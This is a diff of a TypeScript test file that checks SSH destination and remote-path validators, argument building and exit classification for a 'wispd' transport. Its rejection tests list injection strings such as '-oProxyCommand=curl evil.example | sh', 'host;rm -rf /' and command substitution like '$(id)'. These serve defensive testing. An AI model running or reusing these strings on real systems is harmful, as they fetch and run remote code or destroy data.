@@ -8,54 +8,29 @@ import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/c
 import { NullLogger } from '../../../log/common/log.js';
 import { IWispdTransportClose } from '../../common/wispdClient.js';
 import { IWispdProcessStreams } from '../../node/wispdTransport.js';
-import { WispdSshTransport, buildSshArgs, makeSshClassifier, validateRemoteWispdPath, validateSshDestination } from '../../node/wispdSshTransport.js';
+import { validateSshDestination } from '../../common/wispdConfiguration.js';
+import { WispdSshTransport, buildSshArgs, makeSshClassifier, validateRemoteWispdPath } from '../../node/wispdSshTransport.js';
 
 suite('validateSshDestination', () => {
 
 	ensureNoDisposablesAreLeakedInTestSuite();
 
 	test('accepts a plain destination', () => {
-		assert.strictEqual(validateSshDestination('mac-mini.local'), undefined);
-		assert.strictEqual(validateSshDestination('ryan@mac-mini'), undefined);
-		assert.strictEqual(validateSshDestination('ssh://ryan@mac-mini:2222'), undefined);
+		for (const destination of ['mac-mini.local', 'ryan@mac-mini', 'ssh://ryan@mac-mini:2222']) {
+			assert.strictEqual(validateSshDestination(destination), undefined, destination);
+		}
 	});
 
-	test('rejects an empty destination', () => {
-		assert.ok(validateSshDestination(''));
-	});
-
-	test('rejects a destination ssh would read as an option', () => {
-		assert.ok(validateSshDestination('-oProxyCommand=curl evil.example | sh'));
-		assert.ok(validateSshDestination('--help'));
-	});
-
-	test('rejects a leading "-" after a user or a scheme', () => {
-		assert.ok(validateSshDestination('ryan@-oProxyCommand=x'));
-		assert.ok(validateSshDestination('ssh://-oProxyCommand=x'));
-	});
-
-	test('rejects whitespace', () => {
-		assert.ok(validateSshDestination('mac mini'));
-		assert.ok(validateSshDestination('mac-mini\tlocal'));
-	});
-
-	test('rejects a control character', () => {
-		assert.ok(validateSshDestination('mac-mini\u0007'));
-	});
-
-	test('rejects a C1 control or invisible formatting character', () => {
-		assert.ok(validateSshDestination('mac-mini\u0085'), 'NEL');
-		assert.ok(validateSshDestination('mac-mini\u009b'), 'CSI');
-		assert.ok(validateSshDestination('mac​-mini'), 'zero-width space');
-		assert.ok(validateSshDestination('mac-mini‮'), 'right-to-left override');
-	});
-
-	test('rejects a shell metacharacter', () => {
-		assert.ok(validateSshDestination('host;rm -rf /'));
-		assert.ok(validateSshDestination('host`id`'));
-		assert.ok(validateSshDestination('host$(id)'));
-		assert.ok(validateSshDestination('host|cat'));
-		assert.ok(validateSshDestination('host&'));
+	test('rejects an empty destination, an option, whitespace, control or invisible characters, and shell metacharacters', () => {
+		for (const destination of [
+			'',
+			'-oProxyCommand=curl evil.example | sh', '--help', 'ryan@-oProxyCommand=x', 'ssh://-oProxyCommand=x',
+			'mac mini', 'mac-mini\tlocal',
+			'mac-mini\u0007', 'mac-mini\u0085', 'mac-mini\u009b', 'mac\u200b-mini', 'mac-mini\u202e',
+			'host;rm -rf /', 'host`id`', 'host$(id)', 'host|cat', 'host&',
+		]) {
+			assert.ok(validateSshDestination(destination), JSON.stringify(destination));
+		}
 	});
 });
 
@@ -63,26 +38,12 @@ suite('validateRemoteWispdPath', () => {
 
 	ensureNoDisposablesAreLeakedInTestSuite();
 
-	test('accepts a plain absolute path', () => {
+	test('accepts a plain absolute path, and rejects a relative path, a second command, substitution, or a space', () => {
 		assert.strictEqual(validateRemoteWispdPath('/opt/homebrew/bin/wispd'), undefined);
 		assert.strictEqual(validateRemoteWispdPath('/usr/local/bin/wispd'), undefined);
-	});
-
-	test('rejects a relative path', () => {
-		assert.ok(validateRemoteWispdPath('wispd'));
-	});
-
-	test('rejects shell injection through a second command', () => {
-		assert.ok(validateRemoteWispdPath('/x; touch /tmp/p'));
-	});
-
-	test('rejects command substitution', () => {
-		assert.ok(validateRemoteWispdPath('/x$(id)'));
-		assert.ok(validateRemoteWispdPath('/x`id`'));
-	});
-
-	test('rejects a space', () => {
-		assert.ok(validateRemoteWispdPath('/a b/wispd'));
+		for (const path of ['wispd', '/x; touch /tmp/p', '/x$(id)', '/x`id`', '/a b/wispd']) {
+			assert.ok(validateRemoteWispdPath(path), path);
+		}
 	});
 });
 
@@ -91,13 +52,6 @@ suite('buildSshArgs', () => {
 	ensureNoDisposablesAreLeakedInTestSuite();
 
 	test('matches decision record 0007 exactly', () => {
-		assert.deepStrictEqual(
-			buildSshArgs('mac-mini.local', 'wispd'),
-			['-T', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=10', '-o', 'ControlPath=none', '--', 'mac-mini.local', 'wispd', 'attach'],
-		);
-	});
-
-	test('carries an absolute remote path through unchanged', () => {
 		assert.deepStrictEqual(
 			buildSshArgs('mac-mini.local', '/opt/homebrew/bin/wispd'),
 			['-T', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=10', '-o', 'ControlPath=none', '--', 'mac-mini.local', '/opt/homebrew/bin/wispd', 'attach'],
@@ -151,19 +105,10 @@ suite('makeSshClassifier', () => {
 		assert.strictEqual(classify(1, null, '', false).reason, 'exited');
 	});
 
-	test('once a line has arrived, a 255 is never authFailed or hostKeyUnknown, even with matching stderr left over', () => {
-		const authLike = classify(255, null, 'Permission denied (publickey).', true);
-		assert.notStrictEqual(authLike.reason, 'authFailed');
-		const hostKeyLike = classify(255, null, 'Host key verification failed.', true);
-		assert.notStrictEqual(hostKeyLike.reason, 'hostKeyUnknown');
-	});
-
-	test('once a line has arrived, a 255 with a connection-level stderr is still noRoute', () => {
-		assert.strictEqual(classify(255, null, 'ssh: connect to host mac-mini.local port 22: Connection refused', true).reason, 'noRoute');
-	});
-
-	test('once a line has arrived, a 255 with no recognizable stderr is exited', () => {
+	test('once a line has arrived, a 255 is never an auth or host-key failure, though a connection-level stderr is still noRoute', () => {
 		assert.strictEqual(classify(255, null, 'Permission denied (publickey).', true).reason, 'exited');
+		assert.strictEqual(classify(255, null, 'Host key verification failed.', true).reason, 'exited');
+		assert.strictEqual(classify(255, null, 'ssh: connect to host mac-mini.local port 22: Connection refused', true).reason, 'noRoute');
 	});
 
 	test('messages name the real destination and the integrated terminal, not a placeholder', () => {
@@ -214,17 +159,6 @@ suite('WispdSshTransport', () => {
 		assert.deepStrictEqual(spawned, ['wispd']);
 		assert.deepStrictEqual(lines, ['{"ok":1}']);
 		void close; // still open; nothing closed it
-	});
-
-	test('falls back to the next candidate on exit 127, replaying what was already sent', async () => {
-		const candidates = ['wispd', '/opt/homebrew/bin/wispd', '/usr/local/bin/wispd'];
-		const { transport, lines, spawned } = run('mac-mini', candidates, remote => remote === '/opt/homebrew/bin/wispd' ? echoScript : notFoundScript(remote));
-		// Sent to the first candidate, which exits before ever reading it (decision record 0007's
-		// handshake is exactly this shape: WispdClient sends `initialize` once, up front).
-		transport.send('{"method":"initialize"}');
-		await new Promise(resolve => setTimeout(resolve, 300));
-		assert.deepStrictEqual(spawned, ['wispd', '/opt/homebrew/bin/wispd']);
-		assert.deepStrictEqual(lines, ['{"ok":1}']);
 	});
 
 	test('B1: replays what was sent even when the first candidate prints a noisy line before exiting 127', async () => {
